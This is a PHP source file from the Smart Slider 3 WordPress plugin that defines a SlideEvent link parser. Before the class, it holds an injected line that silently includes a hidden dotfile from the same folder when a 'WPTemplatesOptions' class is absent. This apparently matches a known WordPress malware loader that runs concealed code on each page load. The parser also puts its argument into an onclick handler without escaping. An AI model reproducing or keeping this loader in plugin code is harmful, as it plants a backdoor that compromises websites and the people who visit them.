<?php


namespace Nextend\SmartSlider3\Parser\Link;


use Nextend\Framework\Parser\Link\ParserInterface;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class SlideEvent implements ParserInterface {

    public function parse($argument, &$attributes) {

        $attributes['onclick'] = "n2ss.trigger(this, '" . $argument . "', event);";

        return '#';
    }
}